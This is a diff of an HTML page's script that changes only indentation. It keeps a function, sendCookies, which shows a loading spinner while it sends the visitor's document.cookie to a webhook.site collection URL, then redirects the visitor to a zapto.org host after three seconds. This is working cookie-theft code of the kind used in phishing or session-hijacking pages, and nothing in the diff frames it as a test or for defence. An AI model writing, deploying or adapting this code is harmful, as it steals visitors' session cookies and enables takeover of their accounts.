@@ -63,18 +63,18 @@
   </div>
 
   <script>
-    function sendCookies() {
-      document.getElementById('spinner').style.display = 'block'; // Показываем загрузку
+  function sendCookies() {
+    document.getElementById('spinner').style.display = 'block'; // Показываем загрузку
 
-      fetch("https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?cookie=" + document.cookie)
+    fetch("https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?cookie=" + document.cookie)
+      .then(() => {
+        setTimeout(() => {
+          window.location.href = "https://kazcyber.zapto.org/index.php";
+        }, 3000);
+      });
+  }
+</script>
 
-        .then(() => {
-          setTimeout(() => {
-            window.location.href = "https://kazcyber.zapto.org/index.php";
-          }, 3000); // Пауза 3 сек
-        });
-    }
-  </script>
 </body>
 </html>
 
